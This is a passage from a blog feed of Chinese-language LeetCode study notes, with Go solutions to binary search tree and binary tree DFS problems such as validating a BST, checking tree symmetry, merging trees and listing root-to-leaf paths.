punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"3验证二叉搜索树\"><a class=\"anchor\" href=\"#3验证二叉搜索树\">#</a> 3. 验证二叉搜索树</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy92YWxpZGF0ZS1iaW5hcnktc2VhcmNoLXRyZWUvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/validate-binary-search-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDlfQmluYXJ5U2VhcmNoL2xldmVsXzIvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/09_BinarySearch/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给你一个二叉树的根节点  <code>root</code>  ，判断其是否是一个有效的二叉搜索树。</p>\n<p><strong>有效</strong> 二叉搜索树定义如下：</p>\n<ul>\n<li>节点的左子树只包含 <strong>小于</strong> 当前节点的数。</li>\n<li>节点的右子树只包含 <strong>大于</strong> 当前节点的数。</li>\n<li>所有左子树和右子树自身必须也是二叉搜索树。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isValidBST</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tlow<span class=\"token punctuation\">,</span> high <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span>MinInt<span class=\"token punctuation\">,</span> math<span class=\"token punctuation\">.</span>MaxInt</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subValidBST</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">subValidBST</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">,</span> high<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">subValidBST</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> high <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">>=</span> high <span class=\"token operator\">||</span> root<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">&lt;=</span> low <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subValidBST</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">subValidBST</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">,</span> high<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"4将有序数组转换为二叉搜索树\"><a class=\"anchor\" href=\"#4将有序数组转换为二叉搜索树\">#</a> 4. 将有序数组转换为二叉搜索树</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9jb252ZXJ0LXNvcnRlZC1hcnJheS10by1iaW5hcnktc2VhcmNoLXRyZWUvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDlfQmluYXJ5U2VhcmNoL2xldmVsXzMvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/09_BinarySearch/level_3/topic_1.go</span></p>\n<blockquote>\n<p>给你一个整数数组  <code>nums</code>  ，其中元素已经按 <strong>升序</strong> 排列，请你将其转换为一棵 <strong>高度平衡</strong> 二叉搜索树。</p>\n<p><strong>高度平衡</strong> 二叉树是一棵满足「每个节点的左右两个子树的高度差的绝对值不超过 1 」的二叉树。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">sortedArrayToBST</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>TreeNode <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tmid <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\troot <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>TreeNode<span class=\"token punctuation\">&#123;</span>nums<span class=\"token punctuation\">[</span>mid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\troot<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">=</span> <span class=\"token function\">sortedArrayToBST</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>mid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\troot<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">=</span> <span class=\"token function\">sortedArrayToBST</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>mid<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">return</span> root</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/08_binaryTreeDFS/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/08_binaryTreeDFS/",
            "title": "08-二叉树DFS",
            "date_published": "2023-11-22T12:00:00.000Z",
            "content_html": "<h1 id=\"二叉树dfs\"><a class=\"anchor\" href=\"#二叉树dfs\">#</a> 二叉树 DFS</h1>\n<h2 id=\"算法题\"><a class=\"anchor\" href=\"#算法题\">#</a> 算法题</h2>\n<h3 id=\"双指针问题\"><a class=\"anchor\" href=\"#双指针问题\">#</a> 双指针问题</h3>\n<h4 id=\"1相同的树\"><a class=\"anchor\" href=\"#1相同的树\">#</a> 1. 相同的树</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zYW1lLXRyZWUvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/same-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8xL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_1/topic_1.go</span></p>\n<blockquote>\n<p>给你两棵二叉树的根节点  <code>p</code>  和  <code>q</code>  ，编写一个函数来检验这两棵树是否相同。</p>\n<p>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isSameTree</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> q <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> q <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">||</span> q <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> p<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">!=</span> q<span class=\"token punctuation\">.</span>Val <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">isSameTree</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">isSameTree</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"2对称二叉树\"><a class=\"anchor\" href=\"#2对称二叉树\">#</a> 2. 对称二叉树</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zeW1tZXRyaWMtdHJlZS9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/symmetric-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8xL3RvcGljXzIuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_1/topic_2.go</span></p>\n<blockquote>\n<p>给你一个二叉树的根节点  <code>root</code>  ， 检查它是否轴对称。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isSymmetric</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subIsSymmetric</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">subIsSymmetric</span><span class=\"token punctuation\">(</span>node1<span class=\"token punctuation\">,</span> node2 <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> node1 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> node2 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">if</span> node1 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">||</span> node2 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> node1<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">!=</span> node2<span class=\"token punctuation\">.</span>Val <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subIsSymmetric</span><span class=\"token punctuation\">(</span>node1<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> node2<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">subIsSymmetric</span><span class=\"token punctuation\">(</span>node1<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> node2<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"3合并二叉树\"><a class=\"anchor\" href=\"#3合并二叉树\">#</a> 3. 合并二叉树</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9tZXJnZS10d28tYmluYXJ5LXRyZWVzL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/merge-two-binary-trees/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8xL3RvcGljXzMuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_1/topic_3.go</span></p>\n<blockquote>\n<p>给你两棵二叉树：  <code>root1</code>  和  <code>root2</code>  。</p>\n<p>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。你需要将这两棵树合并成一棵新二叉树。合并的规则是：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，<strong>不为</strong> null 的节点将直接作为新二叉树的节点。</p>\n<p>返回合并后的二叉树。</p>\n<p><strong>注意:</strong> 合并过程必须从两个树的根节点开始。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">mergeTrees</span><span class=\"token punctuation\">(</span>root1 <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> root2 <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>TreeNode <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root1 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root2 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> root1 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root2 <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> root1 <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root2 <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\troot1<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">+=</span> root2<span class=\"token punctuation\">.</span>Val</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\troot1<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">=</span> <span class=\"token function\">mergeTrees</span><span class=\"token punctuation\">(</span>root1<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> root2<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\troot1<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">=</span> <span class=\"token function\">mergeTrees</span><span class=\"token punctuation\">(</span>root1<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> root2<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> root1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"路径问\"><a class=\"anchor\" href=\"#路径问\">#</a> 路径问</h3>\n<h4 id=\"4二叉树的所有路径\"><a class=\"anchor\" href=\"#4二叉树的所有路径\">#</a> 4. 二叉树的所有路径</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9iaW5hcnktdHJlZS1wYXRocy9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/binary-tree-paths/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8xL3RvcGljXzQuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_1/topic_4.go</span></p>\n<blockquote>\n<p>给你一个二叉树的根节点  <code>root</code>  ，按 <strong>任意顺序</strong> ，返回所有从根节点到叶子节点的路径。</p>\n<p><strong>叶子节点</strong> 是指没有子节点的节点。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> pathList <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">binaryTreePaths</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpathList <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">dfs</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> pathList</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">dfs</span><span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> path <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> node <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> node<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tpathList <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>pathList<span class=\"token punctuation\">,</span> path<span class=\"token operator\">+</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">dfs</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> path<span class=\"token operator\">+</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"->\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">dfs</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> path<span class=\"token operator\">+</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"->\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"5二叉树的路径总和\"><a class=\"anchor\" href=\"#5二叉树的路径总和\">#</a> 5. 二叉树的路径总和</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wYXRoLXN1bS8=\">https://leetcode.cn/problems/path-sum/</span></p>\n<p><span class=\"exturl\" 